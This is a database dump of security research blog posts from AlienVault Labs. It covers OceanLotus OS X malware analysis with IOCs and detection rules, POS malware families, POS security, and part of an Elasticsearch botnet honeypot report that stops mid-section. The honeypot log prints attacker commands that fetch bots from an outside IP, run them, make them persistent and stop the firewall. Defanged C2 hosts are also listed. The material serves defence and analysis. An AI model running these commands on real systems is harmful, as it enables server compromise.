directories, the Trojan calls chflags(filename, UF_HIDDEN) on the corevideosd and com.google.plugins.plist files. The final step that is taken to lower its profile is to call \'xattr -d -r com.apple.quarantine \"PATH to corevideosd\"\' to remove the quarantine extended attribute from corevideosd. If the Launch Agent is already running, the command \"/bin/launchctl unload\"/Library/LaunchAgents/com.google.plugins.plist\" is used to unload itself before relaunching corevideosd.Command and Control CommunicationThe Trojan attempts to contact multiple command and control servers(C2s) to retrieve commands and additional payloads. The first C2 it attempts to connect to is kiifd[.]pozon7[.]net on port 80 using HTTP. Below is an example of a check-in request.Here, 1AD6A35F4C2D73593912F9F9E1A55097 is the MD5 hash of the IOPlatformUUID. The IOPlatformUUID is obtained by executing the OS X specific command:/usr/sbin/ioreg -rd1 -c IOPlatformExpertDevice | grep \'IOPlatformUUID\'This UUID is also written locally to ~/Library/Preferences/.fDTYuRs. Before being written to disk, the UUID is XOR encrypted using the key \"pth\".Currently, kiifd[.]pozon7[.]net is down, however, the Trojan is coded to download and execute an additional payload if the C2 tells it to. It can run an executable file or open a zipped application bundle (.app application).After contacting the first C2, the Trojan checks a local file ~/Library/Parallels/.cfg (or /Library/Parallels/.cfg) for a list of executables or applications to run. ~/Library/Parallels/.cfg is essentially a \"Startup Items\" file that contains a list of programs to run when the Trojan first starts up. Although the Chinese report says that OceanLotus MAC can detect the Parallels virtual environment, we do not think this is the case. OceanLotus MAC simply stores a hidden configuration file in the /Library/Parallels/ directory.Next the Trojan performs a check-in to an \"encrypted\" C2. It first attempts to connect to shop[.]ownpro[.]net, but if that host is down then it will fallback to pad[.]werzo[.]net. The network communication is made over port 443 but does not use SSL. Instead data is encrypted with a single byte XOR key of 0x1B. During the initial check-in, the victim does not send any data that is unique to the compromised host.After confirming successful communication with the C2, the Trojan gets ready to start handling commands from the C2. It starts by creating a keep-alive thread to \"ping\" the C2 every minute. Then it gathers the following information about the system and current user:Product Name and Version (read from /System/Library/CoreServices/SystemVersion.plist)Machine nameIs the user rootUser\'s name (from pw_gecos)UsernameMD5 hash of the IOPlatformUUID (If IOPlatformUUID can\'t be found, then a combination of username and machine name is used as a unique ID)In addition to the system and user information, the Trojan will obtain the current time from www.microsoft.com. It does this by making an HTTP request to www.microsoft.com and parsing the Data header from the response. There is actually an error in the request - the request made to www.microsoft.com looks like:As you can see, there is no path in the request and the server responds with a 400. Since the Trojan only cares about the Date header in the response, the failed request still works. The parsed date is converted to epoch time and stored in ~/Library/Hash/.Hashtag/.hash (or /Library/Hash/.Hashtag/.hash). Here, there is another error in the code where the Trojan attempts to read the time from ~/Library/Hash/.hash and misses the .HashTag directory. In addition to the timestamp, the values \"th\" and 1 are also stored in the file and the entire contents are XOR encrypted with the key \"camon\".The system and user information is sent to the C2 and finally a new thread is created to handle commands from the C2. Below is a dump of the encrypted communication to the C2.Decoding the system information block with the key 0x1B results in the following data – highlighted are the product name, OS version, username, machine name, and IOPlatformUUID MD5 hash.\\x02\\x10\\x00\\x00\\x00Mac OS X 10.10.5\\x00\\x02\\x00\\x00\\x00av\\t\\x00\\x00\\x00lab_osx_1 \\x00\\x00\\x001AD6A35F4C2D73593912F9F9E1A55097\\xcb\\xf2\\x81V\\x00\\x00\\x00\\[email protected]\\x00\\x00\\x00\\x02\\x00\\x00\\x00th\\x00\\x00\\x00\\x00After sending the system and user information to the C2, this thread attempts to read from the C2 every second, however, it appears that the C2 only sends data once every 5 seconds. If the response from the C2 contains a command directive, the Trojan will execute one of those commands. The following strings were decrypted from the binary and are likely part of an interactive command console on the C2 side.Usage: ls [path]\nUsage: cd <path>\nUsage: pwd\nUsage: rm <file_path>\nUsage: cp <srcpath> <dstpath>\nUsage: mv <srcpath> <dstpath>\nUsage: ps\nUsage: proc <pid>\nUsage: kill <pid>\nUsage: exec <path>\nUsage: info [path]\nUsage: cmd <command system>\nUsage: localip\nUsage: recent\nUsage: windows\nUsage: download fromURL savePath\nUsage: cat path [num_byte]\nUsage: capture <saved_path>\nwhereWith the exception of a few commands these are self-explanatory.\"exec\" opens an application bundle (.app directory) by calling system(\"open <APP Bundle>\")\"info\" returns information about a file or path\"recent\" returns a list of recently opened documents. This done by calling LSSharedFileListCreate(0, kLSSharedFileListRecentDocumentItems, 0);\"windows\" returns information about the currently open windows on the system (e.g. which process owns the window.). This is done with a call to CGWindowListCopyWindowInfo()\"capture\" saves a screenshot of the current desktop to the specified path. This is done by executing the command: \"/usr/sbin/screencapture -x <PATH>\" (the -x option prevents the shutter sound from being played)\"where\" is missing a usage statement, but it is accepted as a command and returns the full path of the running Trojan. This done by executing: \"ps awx | awk \'$1 == [PID] {print $5}\" where PID is the current process ID.In addition to the above functionality, there are commands codes that allow the C2 to perform the following actions (there is some overlap with the previous commands):Update the /Library/Hash/.Hashtag/.hash fileUpdate or read the /Library/Parallels/.cfg fileAutomatically download files from a URLUnzip and open a zipped application bundle, run an executable file, or execute code from a dynamic library.Kill a processDelete a file or pathShutdown the connection to the C2SummaryThe OS X version of OceanLotus is clearly a mature piece of malware that is written specifically for OS X. The use of OS X specific commands and APIs is evidence that the authors are intimately familiar with the operating system and have spent quite a bit of time customizing it for the OS X environment. Similar to other advanced malware, the use of obfuscation and indirection within the binary are an indication that the authors want to protect their work, make it difficult for others to reverse engineer, and reduce detection rates. The fact that VirusTotal still shows a zero detection rate for this threat shows they are succeeding at the latter.We also found a version of OceanLotus that appears to be much simpler. It still communicates with the hardcoded C2 at kiifd[.]pozon7[.]net over port 80, but does not connect to an encrypted C2. This version does not launch multiple threads to handle other tasks and seems less developed so it is most likely an earlier version. We did not perform an in-depth analysis of this earlier variant, however, it could be in interesting exercise to see how the malware has evolved over time.IOCsHashes:ROL3 encoded .en_icon: 9cf500e1149992baae53caee89df456de54689caf5a1bc25750eb22c5eca1cceROL3 decoded .en_icon: 3d974c08c6e376f40118c3c2fa0af87fdb9a6147c877ef0e16adad12ad0ee43aROL3 encoded .DS_Stores: 4c59c448c3991bd4c6d5a9534835a05dc00b1b6032f89ffdd4a9c294d0184e3bROL3 decoded .DS_Stores: 987680637f31c3fc75c5d2796af84c852f546d654def35901675784fffc07e5dEmptyApplication: 12f941f43b5aba416cbccabf71bce2488a7e642b90a3a1cb0e4c75525abb2888App bundle83cd03d4190ad7dd122de96d2cc1e29642ffc34c2a836dbc0e1b03e3b3b55cffAnother older variant that only communicates with the unencrypted C2a3b568fe2154305b3caa1d9a3c42360eacfc13335aee10ac50ef4598e33eea07C2s:kiifd[.]pozon7[.]netshop[.]ownpro[.]netpad[.]werzo[.]netDropped Files:/Library/.SystemPreferences/.prev/.ver.txt or ~/Library/.SystemPreferences/.prev/.ver.txt/Library/Logs/.Logs/corevideosd or ~/Library/Logs/.Logs/corevideosd/Library/LaunchAgents/com.google.plugins.plist or ~/Library/LaunchAgents/com.google.plugins.plist/Library/Parallels/.cfg or /~Library/Parallels/.cfg/tmp/crunzip.temp.XXXXXX (passed to mktemp(), so the actual file will vary)~/Library/Preferences/.fDTYuRs/Library/Hash/.Hashtag/.hash (or ~/Library/Hash/.Hashtag/.hash)DetectionYara Rules\n\nrule oceanlotus_xor_decode\n{\n        meta:\n               author = \"AlienVault Labs\"\n               type = \"malware\"\n               description = \"OceanLotus XOR decode function\"\n    strings:\n        $xor_decode = { 89 D2 41 8A ?? ?? [0-1] 32 0? 88 ?? FF C2 [0-1] 39 ?A [0-1] 0F 43 D? 4? FF C? 48 FF C? [0-1] FF C? 75 E3 }\n    condition:\n        $xor_decode\n}\n \nrule oceanlotus_constants\n{\n        meta:\n               author = \"AlienVault Labs\"\n               type = \"malware\"\n               description = \"OceanLotus constants\"\n    strings:\n        $c1 = { 3A 52 16 25 11 19 07 14 3D 08 0F }\n        $c2 = { 0F 08 3D 14 07 19 11 25 16 52 3A }\n    condition:\n        any of them\n}\n Osquery OceanLotus pack:\n{\n  \"platform\": \"darwin\",\n  \"version\": \"1.4.5\",\n  \"queries\": {\n    \"OceanLotus_launchagent\": {\n      \"query\" : \"select * from launchd where name = \'com.google.plugins.plist\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus Launch Agent\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_1\": {\n      \"query\" : \"select * from file where pattern = \'/Users/%/Library/Logs/.Logs/corevideosd\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_2\": {\n      \"query\" : \"select * from file where path = \'/Library/Logs/.Logs/corevideosd\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_3\": {\n      \"query\" : \"select * from file where pattern = \'/Users/%/Library/.SystemPreferences/.prev/.ver.txt\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_4\": {\n      \"query\" : \"select * from file where path = \'/Library/.SystemPreferences/.prev/.ver.txt\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_5\": {\n      \"query\" : \"select * from file where pattern = \'/Users/%/Library/Parallels/.cfg\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_6\": {\n      \"query\" : \"select * from file where path = \'/Library/Parallels/.cfg\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n\n    },\n    \"OceanLotus_dropped_file_7\": {\n      \"query\" : \"select * from file where pattern = \'/Users/%/Library/Preferences/.fDTYuRs\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_8\": {\n      \"query\" : \"select * from file where pattern = \'/Users/%/Library/Hash/.Hashtag/.hash\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_9\": {\n      \"query\" : \"select * from file where path = \'/Library/Hash/.Hashtag/.hash\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_10\": {\n      \"query\" : \"select * from file where pattern = \'/Users/%/Library/Hash/.hash\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_11\": {\n      \"query\" : \"select * from file where path = \'/Library/Hash/.hash\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    },\n    \"OceanLotus_dropped_file_12\": {\n      \"query\" : \"select * from file where path = \'/tmp/crunzip.temp.%\';\",\n      \"interval\" : \"86400\",\n      \"description\" : \"OceanLotus dropped file\",\n      \"value\" : \"Artifact used by this malware\"\n    }\n  }\n}', 'malwareos xoceanlotus', '/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (32, 'POS Malware Families: An insight into the Behavior of POS Malware', 'AlienVault Labs', 'December 17, 2015 ', 'In a previous blog, we discussed why Point of Sale (POS) devices remain such an attractive target and described some different attack methods. As you can see from the infographic below, retail and POS have been (pardon the pun) “Targets” on an ongoing basis for the past few years, and the trend doesn’t appear to be reversing, even with technologies such as EMV and P2PE. In this blog, we describe some of the different families of this malware.POS Malware Common FeaturesFamilies of this malware typically utilize similar techniques as their end goal is the same – to steal account details, and especially payment card information.Card Data MiningCredit card data (track 1 and track 2 information) is often stored in plain text in memory on the POS device. Several variants of the malware leverage memory scraping capabilities to capture the credit card data using regular expressions (RegEx), when searching through memory to find it. In fact, different families of malware sometimes share parts of RegEx or the entire RegEx. Regular expressions are an easy way to search for patterns that identify specific kinds of data; however, they can be computationally inefficient. Because of this, other malware variants use custom search algorithms to make their searches more efficient. Usually, these custom search algorithms will look for specific pieces of information: track delimiters, account number prefixes that correspond to major card issuers, primary account number (PAN) length, and some validate PANs using the Luhn algorithm. When the malware uses targeted custom searches, rather than scanning all data for patterns, the activity associated with the malware becomes more difficult to detect.Process injection and blacklistingSome of this malware reduces their footprint to avoid detection by injecting processes. In addition to this they increase performance by limiting the number of processes used in memory scraping. Some kinds of malware scrape memory from every process to increase the likelihood of obtaining useful information; however, this also increases the odds that someone will notice the malware. To avoid this, most POS malware has a blacklist of processes that are omitted from memory scraping and it instead targets a few specific processes.KeyloggingA common feature of malware that usually accompanies memory scraping is key logging. Key logging allows attackers to capture PINs in addition to account numbers. PIN pads are usually recognized by an operating system as a keyboard device, so attackers don’t need to write fancy new key logging codes to steal data from PIN pads.Data exfiltrationOnce the malware has captured account details using the above techniques, attackers need to have some way of accessing this data. Some types only store the data locally and don’t have built-in exfiltration features. In such cases, attackers have to manually retrieve the data – typically via some kind of remote session, though manual recovery through physical access is also a possibility.However, many variants of this malware do have built-in exfiltration features that send stolen data to drop sites or command and control servers. Data exfiltration can take many forms. It can range from exfiltration via e-mail, FTP, HTTP, HTTPS, DNS, TOR or other protocols. Some transmit data in plaintext while others obfuscate or encrypt data before transmission.Additional featuresStealing credit card account details is not always the only objective of this malware. Some variants can also incorporate other standard Trojan features such as:Credential harvesting (from browsers and remote access software)File download/upload capabilitiesFile managementAnti-debuggingAnti-detection capabilitiesDescription of specific malware familiesNow that we have a good understanding of the various capabilities of POS malware, we can look more closely at behaviors associated with some of the best-known malware families.RdasrvRdasrv was one of the earliest identified POS RAM scrapers, discovered in early 2011. Rdasrv functions in a manner that is distinct from all other POS RAM scrapers. Instead of looking at all of the processes, it only inspects processes that are hard coded into the malware itself. Patterns that match are written to a text file for manual exfiltration at a later date.DexterBack in 2012 reports emerged on Dexter. Dexter has infected hundreds of point-of-sale computers at big name retailers, hotels, restaurants, and other businesses, according to a report issued by Aviv Raff, chief technology officer of Israel-based security firm Seculert. [1]Dexter steals payment card data from the POS system and sends it to a remote C&C server. The source code for Dexter was leaked sometime ago, leading to many variants being created even to this day as people improve upon the code base.AlinaAlina is a fairly well known POS RAM scraper family, which was discovered in October 2012. As of the writing of this document, Alina variants are still being actively developed by the malware writing community. As a result, its methods of persistence, RAM scraping, and data exfiltration can vary from version to version. For example early versions sent data in plain text, while later ones utilized exclusive or XOR- based encryption, or established contact with multiple C&C servers, etc. Alina variants cast a wider net than other families because targeted processes are not hard-coded, making the malware more versatile and able to target a larger set of victims. [2][3]BlackPOSBlackPOS rose to fame, or perhaps infamy, when it was discovered on the POS systems in retail giant Target, in December 2013. However, back in 2012, the source code of BlackPOS was leaked, which enabled many parties both malicious and non-malicious to examine and improve its codebase. It maintains persistence by masquerading as an AntiVirus program. The exfiltration methods used by the BlackPOS are fairly simple: track 1&2 payment card data is written to a file and offloaded to a FTP for later extraction. [4][5]FrameworkPOSLike BlackPOS, FrameworkPOS rose to infamy after it was found on the POS systems of another major retailer, The Home Depot. FrameworkPOS achieves persistence by installing a Windows Service, which starts at system boot and restarts. The service name is \"McAfee Framework Management Instrumentation”, a name likely chosen to allow it to further blend in. Like many malware families, FrameworkPOS has many variants, one of which stands out due to its method of data exfiltration. Another variant utilizes DNS requests to exfiltrate date, instead of the standard write file to a FTP (as seen during the Home Depot breach). [6][7]ChewbaccaChewbacca was discovered on the POS systems of several dozen different retailers around the world in late 2013. To maintain persistence, it installs itself as “spoolsv.exe” in the startup folder. After installation, the keylogger creates a file called “system.log” inside the system %temp% folder, logging keyboard events and window focus changes. Chewbacca also scrapes memory and utilizes regex to extract track 1 & 2 data of payment cards from the infected system. The extracted information is then transported via tor to a C&C server concealing the real IP address of the Command and Control (C&C) server(s), encrypting traffic, and avoiding network-level detection.BackoffUnlike many of the earlier malware families, Backoff was not built with a specific target in mind, which has allowed it to be used to cause a large number of data breaches. One of the larger ones targeted UPS stores between January and August, 2014. Backoff is also unique in that it uses a runtime packer to protect it from being detected. To maintain persistence Backoff will create an encrypted copy of itself. If the malware stops running for any reason, nsskrnl will be decrypted and executed to re-infect the system by utilizing a code that was injected into an explorer.exe process. Exfiltration and remote control is accomplished by communicating with a remote C&C via HTTP. [8]Cherrypicker POSThe malware dubbed Cherrypicker POS has been around undetected since roughly 2011. It avoids detection by the use of encryption, obfuscation and cleaning up after itself. It injects various based upon it’s configuration and memory scrapes for track 1 and track 2 data, which is then logged. The logged file is then encrypted for communication back to the remote FTP.AbaddonPOSAbaddonPOS is a simplistic piece of malware, coming in at around 5 KB in size. The malware implements several anti-analysis and obfuscation techniques to make manual and automated analysis difficult. To acquire track 1& 2 data the malware scraps all processes memory except it’s own. The majority of the AbaddonPOS’s code is not obfuscated with the exception of the code to encode and transmit payment card details. Which could be explained because unlike many malware families which utilize existing prototols, such as HTTP/IRC/Tor to communicate with a c&c, Abaddon developers created their own binary encoded protocol to exfiltrate data.POS DetectionThe following correlation rules from AlienVault USM are used to detect activity from the aforementioned threats:System Compromise, Malware infection, Dexter POS System Compromise, Malware infection, Alina POS System Compromise, Trojan infection, BlackPOSSystem Compromise, C&C Communication, FrameworkPOSSystem Compromise, C&C Communication, FrameworkPOS DNS ChannelSystem Compromise, Trojan infection, ChewbaccaSystem Compromise, C&C Communication, JackPOSSystem Compromise, Trojan infection, vSkimmerSystem Compromise, C&C Communication, Backoff POSSystem Compromise, C&C Communication, Backoff POS - SSL certificateSystem Compromise, Malware infection, FighterPOSSystem Compromise, Malware infection, BernhardPOSSystem Compromise, Malware infection, FindPOSSystem Compromise, Malware infection, NitloveSystem Compromise, Malware infection , PunkeyPOSSystem Compromise, Trojan infection, NewPosThingsSystem Compromise, C&C Communication, DecebalPOSSystem Compromise, Malware infection, POSCardStealerSystem Compromise, Trojan infection, CherryPickerPOSSystem Compromise, Trojan infection, AbaddonPOSConclusionFor the security researcher, POS malware is an area of research that is of growing interest. Learning about the different families of malware is useful in this research, as it makes variants easier to identify and detect. Understanding the families with similar code base saves valuable time during research, especially when responding to the incident breaches – it is not necessary to view every new malware as something brand new. Lazy attackers are simply modifying existing malware to evade detection in many cases.The following infographic lists most of the recent breaches at retailers caused by the malware we\'ve discussed, depicting an overview of impact.References[1] http://arstechnica.com/security/2012/12/dexter-malware-steals-credit-card-data-from-point-of-sale-terminals/\n[2] http://www.xylibox.com/2013/02/alina-34-pos-malware.html\n[3] http://blog.spiderlabs.com/2013/05/alina-shedding-some-light-on-this-malware-family.html\n[4] http://blog.trendmicro.com/trendlabs-security-intelligence/new-blackpos-malware-emerges-in-the-wild-targets-retail-accounts/\n[5] http://money.cnn.com/2014/02/11/news/companies/retail-breach-timeline/\n[6] https://blog.gdatasoftware.com/blog/article/new-frameworkpos-variant-exfiltrates-data-via-dns-requests.html\n[7] http://www.cyphort.com/wp-content/uploads/2014/11/POS-Malware-Report-WEB.pdf\n[8] https://securelist.com/blog/incidents/58192/chewbacca-a-new-episode-of-tor-based-malware/\n[9] http://sjc1-te-ftp.trendmicro.com/images/tex/pdf/RawPOS%20Technical%20Brief.pdf\n[10] https://usa.visa.com/dam/VCOM/download/merchants/alert-rawpos.pdf\n[11] http://www.cyphort.com/wp-content/uploads/2014/11/POS-Malware-Report-WEB.pdf', 'pos malware', '/blogs/labs-research/pos-malware-families-an-insight-into-the-behavior-of-pos-malware');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (33, 'POS Security: What You Need To Know', 'AlienVault Labs', 'December 9, 2015 ', 'October 1, 2015 marked the deadline set by credit card issuers to shift liability for fraudulent activity from card issuers or payment processors to the party that is the least Europay-Mastercard-Visa (EMV) compliant during a fraudulent transaction. In order to be EMV-compliant, retail merchants should, at a minimum, be switching to EMV card readers that are capable of accepting chipped credit cards.However, switching to the new EMV standard does not eliminate the danger of traditional security threats like Point of Sale (POS) malware. In addition, EMV itself might not make economic sense for all merchants. Check out this blog for some business perspective on why EMV chip-enabled credit card processing is taking so long to adopt in the US.The new, chipped cards are definitely more difficult to counterfeit than traditional cards (though a recent case showed that this is not impossible [1,2]). However, since there is no requirement that new card readers encrypt card data before it reaches POS random access memory (RAM), it might still be possible for RAM scraping malware to extract account numbers and expiration dates even if merchants are using EMV card readers. These stolen account numbers can then be used by cybercriminals in card-not-present transactions (for example, e-commerce) or at locations that still use magnetic stripe readers (without CVV verification).To better protect account numbers from such RAM scrapers, some payment solutions are utilizing tokenization and point-to-point encryption (P2PE). Payment tokenization is the process of replacing the account number with another non-sensitive value that can be mapped back to the actual payment details. However, the actual implementation of tokenization can vary from vendor to vendor, which can lead to weaknesses in specific implementations of tokenization.In general, tokenization prevents (or at least reduces the likelihood of) account numbers being stored in the RAM of POS terminals. Tokens can be single use, short-lived or long-lived. However, tokens that can be used multiple times (potentially) leave the door open for attacks against weak implementations where an attacker might discover a way to reuse tokens. In that case, it might still be possible for malware to scrape for tokens.P2PE makes it a lot more difficult for malware to scrape account numbers. Systems that use P2PE typically encrypt payment details directly on the card-reading device so that this information is not accessible to even the POS terminals themselves. In order to compromise encrypted card data, attackers would need to compromise the actual card-reading hardware device. Since different vendors use different hardware devices, attacks on the hardware would only yield returns on a small subset of the POS market. With non-encrypted data, RAM scrapping malware can target a broad swath of POS systems; however, hardware-specific attacks require a large time investment and typically yield limited returns.Despite the October 1st deadline and vendors starting to use tokenization and P2PE, a recent report [3] states that only 27% of merchants have upgraded to EMV card readers and only 60% of cardholders have received chipped cards. Even though there is movement toward more secure payment infrastructure, there is still a long way to go before even known POS malware is rendered ineffective.In addition, POS malware has typically targeted Windows-based POS terminals. However, POS terminals based on Apple’s iOS and Google’s Android OS have been gaining market share. The security models on these mobile operating systems have, thus far, raised the bar high enough that widespread attacks against those POS systems have not yet occurred. However, this may just be a matter of time, so it is important that we understand how POS malware operates.How does POS Malware Work?Payment card data is most vulnerable when it is in memory as this is where it is least protected. This makes POS RAM scrapers very successful at stealing data. To keep data safe during transit, i.e. when it is passed between systems for processing a payment, it should be encrypted. If it is not, then attackers have yet another way capture/steal card data.Attack MethodsVulnerable Software: When POS systems are configured with vulnerable versions of POS software, this opens the door to attack. When POS systems are purchased from vendors, they come with vendor-specific software that may have built-in vulnerabilities. Attackers can leverage these vulnerabilities to compromise the POS system and access credit card data.Abusing Remote Access Functionality: According to investigations of multiple breaches, attackers often obtain access to data by utilizing a remote administration utility using default credentials. These default credentials are added during the installation of POS software. Using a RAT and default credentials, an attacker can easily breach POS systems.Phishing: A very common & effective method of infection, which is used to distribute a lot of POS malware. Phishing emails are sent to selected targets and malware is delivered either as malicious attachments or as embedded malicious links.Vulnerabilities in Host OS of POS Systems: Infecting the Operating System that powers ATMs/POS terminals with malware capable of stealing financial data is very efficient, as cyber crooks only need to compromise a few devices to collect credit card data and sell it in the underground market.Insider Threats: A malicious insider can cause quite a bit of damage to the enterprise as he/she has authorized access to POS systems and can infect the environment with POS malware. In some cases, malicious employees plug flash drives containing malware into servers containing sensitive data to compromise the payment systems.Attackers utilize one or more of the various attack methods to compromise POS systems and infect them with POS malware to target and capture specific card data and exfiltrate the data to another system, possibly a CnC.ConclusionWhile EMV and P2PE are both steps in the right direction, POS remains a target for an obvious reason: financial gain. We need to keep in mind that the POS terminal is a computer, subject to malware attacks like any other computer. Understanding the attack methods will hopefully help reduce the effectiveness of attempted exploits on retailer’s networks. In addition, payment data should not be stored at all. If credit card data needs to stored, it should be encrypted with symmetric encryption to ensure that it remains secure.About the AuthorsEddie Lee is a seasoned security professional with expertise in a variety of areas including: application security, security tool development, and reverse engineering. He occasionally speaks at security conferences and has been a part of a two-time 1st place CTF team at DEFCON. At AlienVault, he is a Security Researcher working with the Labs team.Krishna Kona is a Security Researcher with 8 years of experience working in the security field. He has a Masters degree in Information Security and his interests include malware analysis, penetration testing and proactive threat research. At AlienVault, he is a Security Researcher working with the Labs team.[1] http://www.cl.cam.ac.uk/research/security/projects/banking/nopin/oakland10chipbroken.pdf[2] http://www.wired.com/2015/10/x-ray-scans-expose-an-ingenious-chip-and-pin-card-hack/[3] http://www.usatoday.com/story/money/personalfinance/2015/09/30/chip-credit-card-deadline/73043464/, http://www.infosecurity-magazine.com/news/chipandpin-deadline-us-nowhere/', 'malwareposemvp2pe', '/blogs/labs-research/pos-security-what-you-need-to-know');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (34, 'ElasticZombie Botnet - Exploiting Elasticsearch Vulnerabilities', 'Markus Manzke', 'December 2, 2015 ', 'Markus Manzke is a Security Analyst at 8ack, an AlienVault partnerWith the rise of inexpensive Virtual Servers and popular services that install insecurely by default, coupled with some juicy vulnerabilities (read: RCE - Remote Code Execution), like CVE-2015-5377 and CVE-2015-1427, this year will be an interesting one for Elasticsearch. Elasticsearch provides plenty of targets for people to exploit and create server-based botnets but in fairness it is not only Elasticsearch that suffers from critical vulnerabilities there is also ShellShock, mongodb-exploits and very recently a bug that hit WebSphere, JBoss, Jenkins and OpenNMS.This blog post analyzes what happens if you run a vulnerable service that is connected to the internet resulting in your server becoming a compliant member of a botnet.With our analysis we concentrate on how the infection happens, what the bots are doing and whom they communicate with, but not the code itself. For a nice read on dissecting Linux-based malware we\'d suggest you read the articles from @MalwareMustDie.Over a period of 3-months we collected more than 30 different bots, giving us enough interesting stuff to play with and analyze.\nExploits against ElasticZombie - Honeypots, 30 daysSetupThis past summer we rolled out some honeypots, designed to simulate Elasticsearch installations that are vulnerable to the latest RCE vulnerabilities, which enabled us to track and record each phase of an exploit and catch the malware to analyze what it does when executed.The Honeypots themselves consisted of a real Elasticsearch server, and we used nginx and lua to detect and record the exploits in GET or POST requests. This allowed us to correlate and track activities, as well as bad actors across all of our honeypots. In the next blog post, we will provide details of the botnet-infrastructure.Within 3-4 days after setup, the first scanners hit some Shodan-scanners and vuln-crawlers from organizations and universities, but also from IPs with no PRT.. A few days after setup we saw the first exploit attempts that allowed ups to fine-tune our setup.Categorizing the BotsThe Bots we collected were ELF-executables, mostly 32-bit-binaries that wouldn’t run on a pure x64-server, but also some 64bit-versions, in opposite the perl-bots Conor Patrick caught this also with a ShellShock-Honeypot some weeks ago.Half of the 30+ bots we collected didn’t run; the remaining 15 bots could be classified into 2 different categories:fBots: Fire & Forget - DDoS-Bots (most of them) that just execute without further installationiBots: more sophisticated bots who install themselves in /etc or /var that can download more modules/bots and delete the original fileThe fBots are well known and nothing new and are sometimes referred to as BillGates/BillGates.lite:xwdl/xoxo - VT - 26 / 57\nudp/syn2500 VT - 27 / 56\nssss/508 VT - 12 / 56iBots, also referred to as IptabLex/IptabLes, have been around for quite some time and were well analyzed in May 2014 and again in June 2015 by MalwareMustDie.yf2: VT - 21 / 56-rwxr-x--- 1 bware bware 1315556 Nov 22 11:13 68089\n-rwxr-x--- 1 bware bware 1312420 Nov 23 08:43 508\n-rwxr-x--- 1 bware bware 1312292 Aug 13 02:36 ssss\n-rwxr-x--- 1 bware bware 1223123 Nov 22 11:35 04\n-rwxr-x--- 1 bware bware 1223123 Sep 15 08:02 syn25000\n-rwxr-x--- 1 bware bware 1223123 Sep 17 13:09 udp\n-rwxr-x--- 1 bware bware 1223123 Dez 2 2014 vpcinull\n-rwxr-x--- 1 bware bware 1128800 Nov 20 13:58 xdg1\n-rwxr-x--- 1 bware bware 1128800 Okt 6 13:33 xdwl\n-rwxr-x--- 1 bware bware 1128800 Dez 13 2013 xoxo\n-rwxr-x--- 1 bware bware 841596 Nov 24 08:10 libvent\n-rwxr-x--- 1 bware bware 727556 Okt 7 08:24 yf2\n-rwxr-x--- 1 bware bware 87600 Nov 23 17:56 TcTWhat we observed among all the bots is that their DNS names for C&C-servers, ports and fallbacks were obfuscated and are not available in plaintext when extracting the strings from the executables. Interestingly, Akamai released an analysis on XORDDoS-Botnets, performing DDoS-attacks, and it could be the case that the bots we collected are hiding such interesting information, but we did not analyze the code of the bots further, so we cannot say for sure.Stage 1: Scan & Exploit!Coming from stage 0 (scans that are merely just GET / - requests) there is a simple way for an attacker to land an exploit: just three requests and you are owned.The following shows one attack, stripped down to the commands executed (you\'ll find a full exploit in the Appendix below):-- download the bots\n00:46:39 [alert] request: wget -O /tmp/yf1 http://114.215.149.148/yf1\n00:46:40 [alert] request: wget -O /tmp/yf2 http://114.215.149.148/yf2\n\n-- hours later ... executing the bot\n05:03:21 [alert] request: chmod 777 /tmp/*\n05:03:22 [alert] request: chmod 777 /tmp/yf2 &\n05:03:22 [alert] request: chmod 777 /tmp/yf1 &\n05:03:23 [alert] request: /tmp/yf2 &\n05:03:23 [alert] request: nohup /tmp/yf2 > /dev/null 2>&1\n05:03:24 [alert] request: /tmp/yf1 &\n05:03:24 [alert] request: nohup /tmp/yf1 > /dev/null 2>&1\n\n-- making changes persistent to start the bot upon next\n-- reboot and shutdown the firewall\n05:03:25 [alert] request: echo \\\"cd /tmp/\\\">>/etc/rc.local\n05:03:25 [alert] request: echo \\\"/tmp/yf2\\\">>/etc/rc.local\n05:03:26 [alert] request: echo \\\"/etc/init.d/iptables stop\\\">>/etc/rc.local\n05:03:26 [alert] request: echo \\\"/tmp/yf1\\\">>/etc/rc.local\n05:03:27 [alert] request: echo \\\"/etc/init.d/iptables stop\\\">>/etc/rc.local\n\nAt this point if you had a vulnerable ElasticSearch instance running you\'d be considered hacked, and if you ran it as Root the infection would be persistent and survive a reboot.Stage 2 : 